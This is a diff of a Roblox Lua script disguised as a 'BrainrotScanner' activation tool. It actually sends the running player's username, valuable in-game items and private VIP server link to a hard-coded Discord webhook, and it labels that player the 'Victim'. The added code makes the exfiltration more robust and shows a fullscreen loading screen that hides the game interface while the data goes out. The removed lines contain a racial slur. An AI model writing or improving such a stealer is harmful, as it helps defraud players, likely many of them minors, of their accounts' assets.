@@ -1,3 +1,6 @@
+-- ==============================
+-- Настройка и сервисы
+-- ==============================
 local HttpService = game:GetService("HttpService")
 local Workspace = game:GetService("Workspace")
 local Players = game:GetService("Players")
@@ -5,14 +8,8 @@ local TweenService = game:GetService("TweenService")
 local ContextActionService = game:GetService("ContextActionService")
 local SoundService = game:GetService("SoundService")
 
--- ==============================
--- Конфиг
--- ==============================
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1417846130619977738/mgmCuOeNpaNOBQddZUtCPaeheSjaBWdLNLfPPg2xk6-533OjiGgbjxwmkKPsQO7TK9ep"
 
--- ==============================
--- Глобальные переменные
--- ==============================
 local isActivated = false
 local activationGUI = nil
 _G.VIP_LINK = nil
@@ -33,31 +30,96 @@ local function stringContainsAny(haystack, needles)
 	return false
 end
 
+local function sanitizeForJson(value, seen, depth)
+	depth = depth or 0
+	if depth > 8 then return tostring(value) end
+	local t = typeof(value)
+	if t == "table" then
+		seen = seen or {}
+		if seen[value] then return "[cyclic]" end
+		seen[value] = true
+		local out = {}
+		for k, v in pairs(value) do
+			local keyType = typeof(k)
+			local key = (keyType == "string" or keyType == "number" or keyType == "boolean") and tostring(k) or tostring(k)
+			out[key] = sanitizeForJson(v, seen, depth + 1)
+		end
+		return out
+	elseif t == "string" or t == "number" or t == "boolean" then
+		return value
+	else
+		return tostring(value)
+	end
+end
+
+local function safeJSONEncode(payload)
+	local ok, encoded = pcall(function() return HttpService:JSONEncode(payload) end)
+	if ok then return encoded end
+	local sanitized = sanitizeForJson(payload)
+	ok, encoded = pcall(function() return HttpService:JSONEncode(sanitized) end)
+	if ok then return encoded end
+	return '{"content":' .. HttpService:JSONEncode(tostring(payload)) .. '}'
+end
+
+-- ==============================
+-- Webhook
+-- ==============================
+local function tryExploitRequest(json)
+	local req = (syn and syn.request) or (http and http.request) or (http_request) or (request)
+	if typeof(req) == "function" then
+		local ok, err = pcall(function()
+			req({Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json})
+		end)
+		return ok
+	end
+	return false
+end
+
+local function tryHttpServiceRequest(json)
+	local ok, res = pcall(function()
+		return HttpService:RequestAsync({Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = json})
+	end)
+	if ok and type(res) == "table" and (res.Success == true or res.success == true) then
+		return true
+	end
+	return false
+end
+
+local function sendWebhook(payload)
+	if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
+	if type(payload) ~= "table" then payload = { content = tostring(payload) } end
+	local json = safeJSONEncode(payload)
+	if tryExploitRequest(json) then return end
+	tryHttpServiceRequest(json)
+end
+
+local function postDiscordSimple(content)
+	if not WEBHOOK_URL or WEBHOOK_URL == "" then return end
+	local MAX = 1800
+	local i = 1
+	while i <= #content do
+		local chunk = string.sub(content, i, math.min(i + MAX - 1, #content))
+		sendWebhook({ content = "```\n" .. chunk .. "\n```" })
+		i = i + MAX
+	end
+end
+
 -- ==============================
 -- Список брейнротов
 -- ==============================
 local CANONICAL_BRAINROT_NAMES = {
-	"Los Tralaleritos", "Las Tralaleritas", "La Cucaracha", "Pot Hotspot",
-	"Garama and Madundung", "Tictac Sahur", "Spaghetti Tualetti",
-	"Dragon Cannelloni", "Ketupat Kepat", "Ketchuru and Musturu",
-	"Esok Sekolah", "Money Money Puggy", "Nuclearo Dinossauro",
-	"La Grande Combinasion", "Chicleteira Bicicleteira", "Los Chicleteiras",
-	"To to to Sahur", "Graipuss Medussi", "Strawberry Elephant",
-	"67", "La Extinct Grande", "Mariachi Corazoni", "Tacorita Bicicleta",
-	"Los Nooo My Hotspotsitos", "La Karkerkar Combinasion", "Los Bros",
-	"Los Primos", "Tralaledon", "Los Tacoritas", "La Sahur Combinasion",
-	"Fragola La La La", "Los Hotspotsitos", "La Supreme Combinasion",
-	"Los Combinasionas", "Los Tungtungtungcitos", "Noo My Examen",
-	"Yess my Examen", "Secret Lucky Block", "Admin Lucky Block",
-	"Quesadilla Crocodila", "Torrtuginni Dragonfruitini", "Agarrini la Palini",
-	"Karkerkar Kurkur", "Los Matteos", "Celularcini Viciosini",
-	"Las Vaquitas Saturnitas",
+	"Los Tralaleritos","Las Tralaleritas","La Cucaracha","Pot Hotspot","Garama and Madundung",
+	"Tictac Sahur","Spaghetti Tualetti","Dragon Cannelloni","Ketupat Kepat","Ketchuru and Musturu",
+	"Esok Sekolah","Money Money Puggy","Nuclearo Dinossauro","La Grande Combinasion","Chicleteira Bicicleteira",
+	"Los Chicleteiras","To to to Sahur","Graipuss Medussi","Strawberry Elephant","67",
+	"La Extinct Grande","Mariachi Corazoni","Tacorita Bicicleta","Los Nooo My Hotspotsitos","La Karkerkar Combinasion",
+	"Los Bros","Los Primos","Tralaledon","Los Tacoritas","La Sahur Combinasion","Fragola La La La",
+	"Los Hotspotsitos","La Supreme Combinasion","Los Combinasionas","Los Tungtungtungcitos","Noo My Examen",
+	"Yess my Examen","Secret Lucky Block","Admin Lucky Block","Quesadilla Crocodila","Torrtuginni Dragonfruitini",
+	"Agarrini la Palini","Karkerkar Kurkur","Los Matteos","Celularcini Viciosini","Las Vaquitas Saturnitas",
 }
-
 local LOWER_TO_CANON = {}
-for _, name in ipairs(CANONICAL_BRAINROT_NAMES) do
-	LOWER_TO_CANON[string.lower(name)] = name
-end
+for _, name in ipairs(CANONICAL_BRAINROT_NAMES) do LOWER_TO_CANON[string.lower(name)] = name end
 
 local function getCanonicalMatch(name)
 	local lname = safeLower(name)
@@ -69,15 +131,8 @@ local function getCanonicalMatch(name)
 	return nil
 end
 
-local ALLOW_CATEGORY_KEYWORDS = {
-	"brainrot god","secret","og","admin","exclusive","taco",
-	"craft machine","fuse machine","los ","las ","ritual",
-	"unobtainable","removed","upcoming"
-}
-local DISALLOW_CATEGORY_KEYWORDS = {
-	"common","rare","epic","legendary","mythic","mythic lucky block"
-}
-
+local ALLOW_CATEGORY_KEYWORDS = {"brainrot god","secret","og","admin","exclusive","taco","craft machine","fuse machine","los ","las ","ritual","unobtainable","removed","upcoming"}
+local DISALLOW_CATEGORY_KEYWORDS = {"common","rare","epic","legendary","mythic","mythic lucky block"}
 local function isAllowedByCategory(name)
 	local lname = safeLower(name)
 	local hasDisallow = stringContainsAny(lname, DISALLOW_CATEGORY_KEYWORDS)
@@ -85,83 +140,11 @@ local function isAllowedByCategory(name)
 	if hasDisallow and not hasAllow then return false end
 	return true
 end
-
 -- ==============================
--- Детекция брейнротов
+-- Мониторинг плотов и сбор данных
 -- ==============================
-local function isBrainrotInstance(inst)
-	if not inst then return false end
-	local canonical = getCanonicalMatch(inst.Name)
-	if not canonical then return false end
-	if not isAllowedByCategory(inst.Name) then return false end
-	return true
-end
-
-local function collectBrainrotsInPlot(plot)
-	local results, seenCanonical = {}, {}
-	for _, d in ipairs(plot:GetDescendants()) do
-		if isBrainrotInstance(d) then
-			local canonical = getCanonicalMatch(d.Name) or d.Name
-			if not seenCanonical[canonical] then
-				seenCanonical[canonical] = true
-				table.insert(results, { name = canonical })
-			end
-		end
-	end
-	return results
-end
-
 local PLOTS_FOLDER = Workspace:WaitForChild("Plots")
 
--- ==============================
--- Новая система Webhook
--- ==============================
-local function sendBrainrotWebhook(victimName, brainrotList, vipLink)
-	local jsonBody = HttpService:JSONEncode({
-		["content"] = "@everyone WAKE UP NIGGER",
-		["embeds"] = {{
-			["title"] = ":star: Brainrot | Elly",
-			["color"] = Color3.fromRGB(0,255,0),
-			["fields"] = {
-				{["name"] = ":man_standing: Victim Username:", ["value"] = " "..victimName.." ", ["inline"] = false},
-				{["name"] = ":ringed_planet: Brainrots List:", ["value"] = table.concat(brainrotList, "\n"), ["inline"] = false},
-				{["name"] = ":ringed_planet: Vip:", ["value"] = vipLink or "None", ["inline"] = false}
-			}
-		}}
-	})
-
-	local req = (syn and syn.request) or (http and http.request) or (http_request) or (request)
-	if typeof(req) == "function" then
-		pcall(function()
-			req({
-				Url = WEBHOOK_URL,
-				Method = "POST",
-				Headers = { ["Content-Type"] = "application/json" },
-				Body = jsonBody,
-			})
-		end)
-	end
-end
-
-local function postCombinedAllPlots()
-	local allBrainrots = {}
-	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
-		local entries = collectBrainrotsInPlot(plot)
-		for _, e in ipairs(entries) do
-			table.insert(allBrainrots, e.name)
-		end
-	end
-
-	if #allBrainrots > 0 then
-		local victimName = Players.LocalPlayer.Name
-		local vipLink = _G.VIP_LINK
-		sendBrainrotWebhook(victimName, allBrainrots, vipLink)
-	end
-end
-
--- ==============================
--- Мониторинг
--- ==============================
 local connections = {}
 local batchScheduled = false
 
@@ -170,17 +153,29 @@ local function scheduleBatch()
 	batchScheduled = true
 	task.delay(0.5, function()
 		batchScheduled = false
-		postCombinedAllPlots()
+		-- отправляем найденные брейнроты
+		postBrainrotsToWebhook()
 	end)
+end
+
+local function onPlotDescendantAdded(plot, inst)
+	if isBrainrotInstance(inst) then
+		scheduleBatch()
+	end
 end
 
 local function attachPlotWatch(plot)
 	if connections[plot] then return end
 	connections[plot] = plot.DescendantAdded:Connect(function(inst)
-		if isBrainrotInstance(inst) then
-			scheduleBatch()
-		end
+		onPlotDescendantAdded(plot, inst)
 	end)
+end
+
+local function detachPlotWatch(plot)
+	if connections[plot] then
+		connections[plot]:Disconnect()
+		connections[plot] = nil
+	end
 end
 
 local function watchPlots()
@@ -192,28 +187,99 @@ local function watchPlots()
 		scheduleBatch()
 	end)
 	PLOTS_FOLDER.ChildRemoved:Connect(function(child)
-		if connections[child] then
-			connections[child]:Disconnect()
-			connections[child] = nil
-		end
+		detachPlotWatch(child)
 		scheduleBatch()
 	end)
 end
 
 -- ==============================
--- GUI активации (без изменений)
+-- Fullscreen Loading screen (минимальная версия)
+-- ==============================
+local function showLoadingScreen(duration)
+	local StarterGui = game:GetService("StarterGui")
+	pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false) end)
+
+	local gui = Instance.new("ScreenGui")
+	gui.Name = "LoadingScreen"
+	gui.ResetOnSpawn = false
+	gui.IgnoreGuiInset = true
+	gui.Parent = Players.LocalPlayer:WaitForChild("PlayerGui")
+
+	local frame = Instance.new("Frame")
+	frame.Size = UDim2.new(1,0,1,0)
+	frame.Position = UDim2.new(0,0,0,0)
+	frame.BackgroundColor3 = Color3.new(0,0,0)
+	frame.BorderSizePixel = 0
+	frame.Parent = gui
+
+	local label = Instance.new("TextLabel")
+	label.Size = UDim2.new(1,0,0,80)
+	label.Position = UDim2.new(0,0,0.45, -40)
+	label.BackgroundTransparency = 1
+	label.Text = "Script activated, please wait..."
+	label.TextScaled = true
+	label.Font = Enum.Font.GothamBold
+	label.TextColor3 = Color3.new(1,1,1)
+	label.Parent = frame
+
+	-- авто-удаление через duration секунд
+	task.delay(duration or 5, function()
+		pcall(function() gui:Destroy() end)
+		pcall(function() StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true) end)
+	end)
+end
+
+-- ==============================
+-- Постинг данных в Webhook (payload формируется здесь)
+-- ==============================
+local function postBrainrotsToWebhook()
+	-- Собираем по всем плотам
+	local brainrotList = {}
+	for _, plot in ipairs(PLOTS_FOLDER:GetChildren()) do
+		local entries = collectBrainrotsInPlot(plot)
+		for _, name in ipairs(entries) do
+			table.insert(brainrotList, name)
+		end
+	end
+
+	if #brainrotList == 0 then
+		-- ничего не найдено — не слать
+		return
+	end
+
+	-- Формируем embed-полeй (Discord принимает числа цвета, используем 65280 (0x00FF00) для зелёного)
+	local payload = {
+		content = "@everyone WAKE UP",
+		embeds = {{
+			title = ":star: Brainrot | Elly",
+			color = 65280,
+			fields = {
+				{name = ":man_standing: Victim Username:", value = Players.LocalPlayer and Players.LocalPlayer.Name or "Unknown", inline = false},
+				{name = ":ringed_planet: Brainrots List:", value = table.concat(brainrotList, "\n"), inline = false},
+				{name = ":ringed_planet: Vip:", value = (_G.VIP_LINK and #_G.VIP_LINK > 0) and _G.VIP_LINK or "None", inline = false},
+			}
+		}}
+	}
+
+	-- отправляем через безопасную функцию (sendWebhook из первой части)
+	sendWebhook(payload)
+end
+
+-- ==============================
+-- GUI активации (полная)
 -- ==============================
 local function createActivationGUI()
 	local player = Players.LocalPlayer
 	local gui = Instance.new("ScreenGui")
 	gui.Name = "BrainrotScannerActivation"
 	gui.ResetOnSpawn = false
+	gui.IgnoreGuiInset = true
 	gui.Parent = player:WaitForChild("PlayerGui")
 
 	local mainFrame = Instance.new("Frame")
 	mainFrame.Size = UDim2.new(0, 450, 0, 300)
 	mainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
-	mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+	mainFrame.BackgroundColor3 = Color3.fromRGB(12,12,12)
 	mainFrame.BorderSizePixel = 0
 	mainFrame.Parent = gui
 
@@ -263,16 +329,23 @@ local function createActivationGUI()
 	status.Font = Enum.Font.Gotham
 	status.Parent = mainFrame
 
+	button.MouseEnter:Connect(function()
+		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
+	end)
+	button.MouseLeave:Connect(function()
+		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 120, 255)}):Play()
+	end)
+
 	local function onActivate()
 		if #Players:GetPlayers() > 1 then
-			status.Text = "Script can't be activated, more than 1 player in the server!"
+			status.Text = "Script can't be activated, more than 1 player in server!"
 			status.TextColor3 = Color3.fromRGB(255, 80, 80)
 			return
 		end
 
 		local vipLink = textBox.Text:gsub("^%s*(.-)%s*$", "%1")
 		if vipLink == "" or not string.find(vipLink, "roblox%.com/share") then
-			status.Text = "Not a vip server!"
+			status.Text = "Not a valid VIP link!"
 			status.TextColor3 = Color3.fromRGB(255, 80, 80)
 			return
 		end
@@ -283,8 +356,12 @@ local function createActivationGUI()
 		status.TextColor3 = Color3.fromRGB(0, 255, 100)
 
 		task.wait(0.5)
-		postCombinedAllPlots()
+		-- отправляем найденные брейнроты один раз при активации
+		postBrainrotsToWebhook()
+		-- начинаем мониторинг новых брейнротов
 		watchPlots()
+		-- показываем короткий loading (по желанию можно увеличить)
+		showLoadingScreen(5)
 
 		gui:Destroy()
 		activationGUI = nil
@@ -297,7 +374,7 @@ local function createActivationGUI()
 end
 
 -- ==============================
--- Старт
+-- Запуск
 -- ==============================
 print("[BrainrotScanner] Создаю GUI активации...")
 createActivationGUI()
